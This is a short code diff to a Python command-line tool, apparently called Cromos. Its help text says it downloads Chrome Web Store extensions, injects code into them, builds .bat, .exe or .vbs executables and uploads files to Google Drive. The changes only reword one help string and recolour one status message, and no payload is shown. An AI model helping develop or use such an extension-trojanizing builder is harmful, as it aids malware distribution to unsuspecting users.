@@ -40,7 +40,7 @@ def Help () :
 
 	parser = argparse.ArgumentParser(description="Download and Inject code into Google Chrome extensions", usage="python cromos.py --help")
 	parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str, default="", required=True)
-	parser.add_argument('--load', help='Load a module to run in background with the application', type=str)
+	parser.add_argument('--load', help='Load a script to run in background with the application', type=str)
 	parser.add_argument('--build', help='Build types .bat\n.exe\n.vbs', type=str)
 	parser.add_argument('--key', help='API key for uploading files in Google Drive', type=str)
 
@@ -71,7 +71,7 @@ if __name__== "__main__" :
 		print(Color.green + "[+]" + Color.endc + " Loading the module {}".format(module))
 		loader = Loader(module).inject()
 
-		print(Color.green + "[+]" + Color.endc + " Creating executable file in output/builds/{}.{} ...".format(extension, build))
+		print(Color.warning + "[!]" + Color.endc + " Creating executable file in output/builds/{}.{} ...".format(extension, build))
 		build = Build(extension, build).Builder()
 
 		cromos.extract()
